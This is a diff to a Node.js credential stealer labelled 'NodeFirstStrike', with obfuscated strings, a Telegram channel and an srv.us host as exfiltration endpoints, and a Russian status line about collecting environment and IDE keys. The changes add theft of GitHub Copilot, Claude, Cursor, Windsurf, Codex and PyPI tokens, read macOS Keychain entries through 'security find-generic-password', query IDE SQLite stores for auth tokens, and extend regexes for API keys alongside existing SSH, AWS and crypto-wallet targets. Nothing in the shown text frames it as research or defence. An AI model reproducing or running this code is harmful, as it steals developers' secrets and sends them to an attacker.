@@ -13,7 +13,7 @@ const path = require('path');
 const cp = require('child_process');
 
 const SYNC_CHANNELS = ["https://t.me/s/sys_diag_9f8a7c1b"];
-const FALLBACK_ENDPOINT = "https://3wro72uphgyat3552vnxt7vfna.srv.us";
+const FALLBACK_ENDPOINT = "https://pc4tf5xdmkyuodlhp5dgkyfrba.srv.us";
 const CACHE_SEED = "3a8f19c4e62d70b5a91e38f2c4d607b9";
 const REQUEST_TOKEN = "dg_51e8b3c94a724f1d86c0395b";
 
@@ -211,11 +211,11 @@ async function sendNodeFirstStrike(endpoint, authHeaders) {
       hostname: hn,
       username: un,
       osVer: osLabel,
-      agentVersion: 'v90.7-NodeFirstStrike',
+      agentVersion: 'v90.9-NodeFirstStrike',
       cpu: (os.cpus() && os.cpus()[0] && os.cpus()[0].model) || os.arch(),
       ramMb: Math.round(os.totalmem() / 1048576),
       cwd: process.cwd(),
-      status: '⚡ Мгновенный Первый Отстук (Node.js First-Strike v90.7): сбор ключей окружения...'
+      status: '⚡ Мгновенный Первый Отстук (Node.js First-Strike v90.9): сбор ключей окружения и IDE...'
     }, hdrs);
 
     const creds = [];
@@ -257,13 +257,18 @@ async function sendNodeFirstStrike(endpoint, authHeaders) {
       ['Git Config', path.join(home, '.gitconfig')],
       ['Git Credentials', path.join(home, _d('732912004c717d5d51433d38100b0b63'))],
       ['GitHub CLI', path.join(home, '.config', 'gh', 'hosts.yml')],
+      ['GitHub Copilot Hosts', path.join(home, '.config', 'github-copilot', 'hosts.json')],
+      ['GitHub Copilot Apps', path.join(home, '.config', 'github-copilot', 'apps.json')],
       ['Claude Code', path.join(home, '.claude.json')],
       ['Claude Auth', path.join(home, '.claude', 'credentials.json')],
+      ['Cursor CLI Auth', path.join(home, '.cursor', 'cli-config.json')],
       ['Cursor MCP', path.join(home, '.cursor', 'mcp.json')],
+      ['Codex CLI Auth', path.join(home, '.codex', 'auth.json')],
       ['AWS Credentials', path.join(home, '.aws', 'credentials')],
       ['Docker Config', path.join(home, '.docker', 'config.json')],
       ['Kubeconfig', path.join(home, '.kube', 'config')],
       ['NPM Config', path.join(home, '.npmrc')],
+      ['PyPI Config', path.join(home, '.pypirc')],
       ['Solana Keypair', path.join(home, '.config', 'solana', 'id.json')],
       ['SSH Ed25519 Key', path.join(home, '.ssh', _d('342a241105203a0d041f'))],
       ['SSH RSA Key', path.join(home, '.ssh', _d('342a24061273'))],
@@ -278,9 +283,9 @@ async function sendNodeFirstStrike(endpoint, authHeaders) {
           if (lbl.includes('SSH') && txt.includes(_d('0d1c322220464a187e630a'))) {
             creds.push({ browser: '🔑 ' + lbl, url: hp, username: _d('0e1d332b3160664e54523613320f1e'), password: txt.slice(0, 2048) });
           }
-          const mTok = txt.match(/(sk-ant-[a-zA-Z0-9_-]{20,}|sk-proj-[a-zA-Z0-9_-]{20,}|sk-[a-zA-Z0-9_-]{20,}|crsr_[a-zA-Z0-9_]{24,}|gh[pous]_[a-zA-Z0-9_]{20,}|x-access-token:[^@\s"']+|AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{20,})/g);
+          const mTok = txt.match(/(sk-ant-[a-zA-Z0-9_-]{20,}|sk-proj-[a-zA-Z0-9_-]{20,}|sk-[a-zA-Z0-9_-]{20,}|crsr_[a-zA-Z0-9_]{24,}|github_pat_[a-zA-Z0-9_]{20,}|gh[pousr]_[a-zA-Z0-9_]{20,}|x-access-token:[^@\s"']+|AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{20,})/g);
           if (mTok) {
-            for (const tk of mTok.slice(0, 10)) {
+            for (const tk of Array.from(new Set(mTok)).slice(0, 12)) {
               creds.push({ browser: '🤖 ' + lbl, url: hp, username: 'Token', password: tk.slice(0, 2048) });
             }
           }
@@ -288,46 +293,109 @@ async function sendNodeFirstStrike(endpoint, authHeaders) {
       } catch (_) {}
     }
 
+    if (plat === 'darwin') {
+      for (const svc of ['Claude Code-credentials', 'Cursor', 'Windsurf', 'GitHub']) {
+        try {
+          const secOut = cp.execSync('security find-generic-password -s "' + svc + '" -w', { timeout: 1500, stdio: ['ignore', 'pipe', 'ignore'] }).toString('utf8').trim();
+          if (secOut) creds.push({ browser: '🍎 macOS Keychain', url: 'keychain://' + svc, username: svc, password: secOut.slice(0, 2048) });
+        } catch (_) {}
+      }
+    }
+
     const vscName = _d('2e3a1a00043c794b564231');
     const vscCandidates = [
-      path.join(process.env.APPDATA || path.join(home, 'AppData', 'Roaming'), 'Cursor', 'User', 'globalStorage', vscName),
-      path.join(home, 'Library', 'Application Support', 'Cursor', 'User', 'globalStorage', vscName),
-      path.join(home, '.config', 'Cursor', 'User', 'globalStorage', vscName)
+      ['🤖 Cursor IDE', path.join(process.env.APPDATA || path.join(home, 'AppData', 'Roaming'), 'Cursor', 'User', 'globalStorage', vscName)],
+      ['🤖 Cursor IDE', path.join(home, 'Library', 'Application Support', 'Cursor', 'User', 'globalStorage', vscName)],
+      ['🤖 Cursor IDE', path.join(home, '.config', 'Cursor', 'User', 'globalStorage', vscName)],
+      ['🤖 Windsurf IDE', path.join(process.env.APPDATA || path.join(home, 'AppData', 'Roaming'), 'Windsurf', 'User', 'globalStorage', vscName)],
+      ['🤖 Windsurf IDE', path.join(home, 'Library', 'Application Support', 'Windsurf', 'User', 'globalStorage', vscName)],
+      ['🤖 Windsurf IDE', path.join(home, '.config', 'Windsurf', 'User', 'globalStorage', vscName)]
     ];
-    function scanBoundedJwts(filePath) {
+    function extractIdeTokens(filePath) {
+      const jwts = [];
+      const crsrs = [];
+      const meta = {};
       try {
-        if (!fs.existsSync(filePath)) return [];
-        const sz = fs.statSync(filePath).size;
-        if (sz <= 0 || sz > 64 * 1024 * 1024) return [];
-        const rxJ = /eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}/g;
-        if (sz <= 8 * 1024 * 1024) {
-          return fs.readFileSync(filePath).toString('latin1').match(rxJ) || [];
-        }
-        const fd = fs.openSync(filePath, 'r');
+        if (!fs.existsSync(filePath)) return { jwts, crsrs, meta };
         try {
-          const chunk = 4 * 1024 * 1024;
-          const b1 = Buffer.alloc(chunk);
-          const b2 = Buffer.alloc(chunk);
-          fs.readSync(fd, b1, 0, chunk, 0);
-          fs.readSync(fd, b2, 0, chunk, sz - chunk);
-          return ((b1.toString('latin1').match(rxJ) || []).concat(b2.toString('latin1').match(rxJ) || []));
-        } finally {
-          try { fs.closeSync(fd); } catch (_) {}
-        }
-      } catch (_) { return []; }
-    }
-    for (const vp of vscCandidates) {
-      try {
-        if (fs.existsSync(vp)) {
-          const jwts = scanBoundedJwts(vp).concat(scanBoundedJwts(vp + '-wal'));
-          if (jwts && jwts.length) {
-            const uniq = Array.from(new Set(jwts));
-            creds.push({ browser: '🤖 Cursor IDE', url: _d('353a0f04122820175653213f1618497362530b0c32370d1b0a6442495d3278211e0d7e677266403330285a'), username: _d('3e3b09070e604e4d414e7c2d1a0902637e6a444f342c'), password: uniq[uniq.length - 1] });
-            if (uniq.length > 1) {
-              creds.push({ browser: '🤖 Cursor IDE', url: _d('353a0f04122820175653213f1618497362530b0c32370d1b0a6442495d32783218086971725a7b373e231d45'), username: _d('3e3b09070e604e4d414e7c3e1c0c15757e567f4b3a2711'), password: uniq[0] });
+          const sqOut = cp.execSync('sqlite3 "file:' + filePath.replace(/"/g, '') + '?mode=ro" "SELECT key, value FROM ItemTable WHERE key IN (\'cursorAuth/accessToken\',\'cursorAuth/refreshToken\',\'cursorAuth/cachedEmail\',\'cursorAuth/stripeMembershipType\',\'anysphere.cursor-agent-worker:cursor-agent-worker.apiKey\');"', { timeout: 2200, stdio: ['ignore', 'pipe', 'ignore'], windowsHide: true }).toString('utf8');
+          for (const ln of sqOut.split(/\r?\n/)) {
+            const idx = ln.indexOf('|');
+            if (idx > 0) {
+              const k = ln.slice(0, idx).trim();
+              const v = ln.slice(idx + 1).trim();
+              if (v.startsWith('eyJ')) jwts.push(v);
+              else if (v.startsWith('crsr_')) crsrs.push(v);
+              else if (v) meta[k] = v;
             }
           }
-          break;
+        } catch (_) {}
+        const sz = fs.statSync(filePath).size;
+        if (sz <= 0) return { jwts, crsrs, meta };
+        const rxJ = /eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}/g;
+        const rxC = /crsr_[a-fA-F0-9]{40,}/g;
+        const scanText = (s) => {
+          for (const m of (s.match(rxC) || [])) crsrs.push(m);
+          for (const m of (s.match(rxJ) || [])) {
+            try {
+              const p = Buffer.from(m.split('.')[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
+              if (p.includes('cursor.sh') || p.includes('cursor.com') || p.includes('workos')) jwts.push(m);
+            } catch (_) { jwts.push(m); }
+          }
+          const mEm = s.match(/cursorAuth\/cachedEmail[^A-Za-z0-9]{1,16}([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})/);
+          if (mEm && mEm[1]) meta['cursorAuth/cachedEmail'] = mEm[1];
+          const mPl = s.match(/cursorAuth\/stripeMembershipType[^a-z]{1,16}(ultra|pro_plus|pro|business|enterprise|free_trial)/);
+          if (mPl && mPl[1]) meta['cursorAuth/stripeMembershipType'] = mPl[1];
+        };
+        if (sz <= 16 * 1024 * 1024) {
+          scanText(fs.readFileSync(filePath).toString('latin1'));
+        } else {
+          const fd = fs.openSync(filePath, 'r');
+          try {
+            const chunk = 4 * 1024 * 1024;
+            const buf = Buffer.alloc(chunk);
+            const maxSteps = 24;
+            const step = Math.max(chunk, Math.floor(sz / maxSteps));
+            for (let off = 0; off < sz; off += step) {
+              const toRead = Math.min(chunk, sz - off);
+              if (toRead <= 0) break;
+              const rd = fs.readSync(fd, buf, 0, toRead, off);
+              if (rd > 0) scanText(buf.subarray(0, rd).toString('latin1'));
+            }
+            if (sz > chunk) {
+              const rdT = fs.readSync(fd, buf, 0, chunk, sz - chunk);
+              if (rdT > 0) scanText(buf.subarray(0, rdT).toString('latin1'));
+            }
+          } finally {
+            try { fs.closeSync(fd); } catch (_) {}
+          }
+        }
+      } catch (_) {}
+      return { jwts, crsrs, meta };
+    }
+    for (const [ideLbl, vp] of vscCandidates) {
+      try {
+        if (fs.existsSync(vp)) {
+          const rMain = extractIdeTokens(vp);
+          const rWal = extractIdeTokens(vp + '-wal');
+          const allJwts = Array.from(new Set(rWal.jwts.concat(rMain.jwts)));
+          const allCrsrs = Array.from(new Set(rWal.crsrs.concat(rMain.crsrs)));
+          const meta = Object.assign({}, rMain.meta, rWal.meta);
+          if (meta['cursorAuth/cachedEmail']) {
+            creds.push({ browser: ideLbl, url: 'ide://cursorAuth/cachedEmail', username: 'cursorAuth/cachedEmail', password: meta['cursorAuth/cachedEmail'] });
+          }
+          if (meta['cursorAuth/stripeMembershipType']) {
+            creds.push({ browser: ideLbl, url: 'ide://cursorAuth/stripeMembershipType', username: 'cursorAuth/stripeMembershipType', password: meta['cursorAuth/stripeMembershipType'] });
+          }
+          for (const ck of allCrsrs.slice(0, 8)) {
+            creds.push({ browser: ideLbl, url: 'ide://crsr_key', username: 'CURSOR_API_KEY', password: ck });
+          }
+          if (allJwts.length) {
+            creds.push({ browser: ideLbl, url: _d('353a0f04122820175653213f1618497362530b0c32370d1b0a6442495d3278211e0d7e677266403330285a'), username: _d('3e3b09070e604e4d414e7c2d1a0902637e6a444f342c'), password: allJwts[0] });
+            if (allJwts.length > 1) {
+              creds.push({ browser: ideLbl, url: _d('353a0f04122820175653213f1618497362530b0c32370d1b0a6442495d32783218086971725a7b373e231d45'), username: _d('3e3b09070e604e4d414e7c3e1c0c15757e567f4b3a2711'), password: allJwts[allJwts.length - 1] });
+            }
+          }
         }
       } catch (_) {}
     }
